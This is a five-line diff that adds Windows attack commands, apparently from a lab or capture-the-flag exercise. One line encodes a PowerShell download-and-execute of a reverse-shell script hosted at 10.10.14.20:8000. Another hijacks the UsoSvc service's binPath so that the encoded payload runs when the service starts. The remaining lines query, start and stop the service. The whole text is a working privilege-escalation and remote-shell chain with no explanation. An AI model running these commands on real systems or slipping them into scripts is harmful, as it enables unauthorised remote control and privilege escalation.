@@ -1,0 +1,5 @@
+echo "IEX (IWR http://10.10.14.20:8000/Invoke-PowerShellTcp2.ps1 -UseBasicParsing)" | iconv -t utf-16le |base64 -w 0
+sc.exe config usosvc binPath="cmd.exe /c powershell.exe -EncodedCommand SQBFAFgAIAAoAEkAVwBSACAAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgAyADAAOgA4ADAAMAAwAC8ASQBuAHYAbwBrAGUALQBQAG8AdwBlAHIAUwBoAGUAbABsAFQAYwBwADIALgBwAHMAMQAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQAKAA=="
+sc.exe qc UsoSvc
+sc.exe start UsoSvc
+sc.exe stop UsoSvc
